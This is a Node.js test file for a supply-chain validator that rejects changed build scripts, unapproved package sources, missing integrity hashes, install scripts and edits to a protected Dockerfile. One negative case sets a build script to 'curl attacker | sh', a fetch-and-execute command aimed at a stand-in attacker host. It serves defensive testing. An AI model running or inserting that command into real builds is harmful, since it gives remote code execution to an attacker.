#!/usr/bin/env node

import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { execFileSync } from "node:child_process";
import {
  validateProtectedFiles,
  validateRuntimeDependencyFiles,
} from "../validate-runtime-dependency-policy.mjs";

const root = fs.mkdtempSync(path.join(os.tmpdir(), "preview-runtime-policy-"));
const write = (name, value) => {
  const file = path.join(root, name);
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, typeof value === "string" ? value : JSON.stringify(value));
  return file;
};
const expectFailure = (fn, pattern) => assert.throws(fn, pattern);

try {
  const trusted = { name: "api", version: "1.0.0", scripts: { build: "tsc" }, dependencies: { express: "1.0.0" } };
  const candidate = { ...trusted, dependencies: { express: "1.0.0", sharp: "0.35.3" } };
  const lock = {
    name: "api",
    version: "1.0.0",
    lockfileVersion: 3,
    packages: {
      "": { name: "api", version: "1.0.0", dependencies: candidate.dependencies },
      "node_modules/express": { version: "1.0.0", resolved: "https://registry.npmjs.org/express/-/express-1.0.0.tgz", integrity: "sha512-express" },
      "node_modules/sharp": { version: "0.35.3", resolved: "https://registry.npmjs.org/sharp/-/sharp-0.35.3.tgz", integrity: "sha512-sharp" },
    },
  };
  const trustedFile = write("trusted.json", trusted);
  const candidateFile = write("candidate.json", candidate);
  const lockFile = write("candidate-lock.json", lock);

  const trustedLockFile = write("trusted-lock.json", { ...lock, packages: { ...lock.packages, "": { ...lock.packages[""], dependencies: trusted.dependencies } } });
  const validate = (packagePath, lockPath) => validateRuntimeDependencyFiles({ trustedPackagePath: trustedFile, trustedLockPath: trustedLockFile, candidatePackagePath: packagePath, candidateLockPath: lockPath });
  validate(trustedFile, trustedLockFile);
  validate(candidateFile, lockFile);

  const changedScript = write("changed-script.json", { ...candidate, scripts: { build: "curl attacker | sh" } });
  expectFailure(() => validate(changedScript, lockFile), /Only dependency maps/);
  const inconsistent = write("inconsistent-lock.json", { ...lock, packages: { ...lock.packages, "": { ...lock.packages[""], dependencies: trusted.dependencies } } });
  expectFailure(() => validate(candidateFile, inconsistent), /does not match/);
  const corrupted = write("corrupted-lock.json", "{not-json");
  expectFailure(() => validate(candidateFile, corrupted), /JSON/);
  const gitSource = write("git-source-lock.json", { ...lock, packages: { ...lock.packages, "node_modules/sharp": { ...lock.packages["node_modules/sharp"], resolved: "git+https://example.invalid/sharp.git" } } });
  expectFailure(() => validate(candidateFile, gitSource), /Unapproved package source/);
  const noIntegrity = write("no-integrity-lock.json", { ...lock, packages: { ...lock.packages, "node_modules/sharp": { version: "0.35.3", resolved: "https://registry.npmjs.org/sharp/-/sharp-0.35.3.tgz" } } });
  expectFailure(() => validate(candidateFile, noIntegrity), /Missing sha512 integrity/);
  const installScript = write("install-script-lock.json", { ...lock, packages: { ...lock.packages, "node_modules/sharp": { ...lock.packages["node_modules/sharp"], hasInstallScript: true } } });
  expectFailure(() => validate(candidateFile, installScript), /install scripts/);

  const repo = path.join(root, "repo");
  fs.mkdirSync(path.join(repo, "rentchain-api"), { recursive: true });
  execFileSync("git", ["init", "-q"], { cwd: repo });
  execFileSync("git", ["config", "user.email", "qa@invalid.example"], { cwd: repo });
  execFileSync("git", ["config", "user.name", "QA"], { cwd: repo });
  fs.writeFileSync(path.join(repo, "rentchain-api/Dockerfile"), "FROM node:20\n");
  execFileSync("git", ["add", "."], { cwd: repo });
  execFileSync("git", ["commit", "-qm", "trusted"], { cwd: repo });
  const trustedSha = execFileSync("git", ["rev-parse", "HEAD"], { cwd: repo, encoding: "utf8" }).trim();
  fs.writeFileSync(path.join(repo, "app.js"), "feature\n");
  execFileSync("git", ["add", "."], { cwd: repo });
  execFileSync("git", ["commit", "-qm", "application"], { cwd: repo });
  const allowedSha = execFileSync("git", ["rev-parse", "HEAD"], { cwd: repo, encoding: "utf8" }).trim();
  validateProtectedFiles({ repository: repo, trustedSha, sourceSha: allowedSha });
  fs.writeFileSync(path.join(repo, "rentchain-api/Dockerfile"), "FROM attacker\n");
  execFileSync("git", ["add", "."], { cwd: repo });
  execFileSync("git", ["commit", "-qm", "unsafe"], { cwd: repo });
  const unsafeSha = execFileSync("git", ["rev-parse", "HEAD"], { cwd: repo, encoding: "utf8" }).trim();
  expectFailure(() => validateProtectedFiles({ repository: repo, trustedSha, sourceSha: unsafeSha }), /Command failed/);

  console.log("Preview runtime dependency policy validation passed: positive and negative cases");
} finally {
  fs.rmSync(root, { recursive: true, force: true });
}
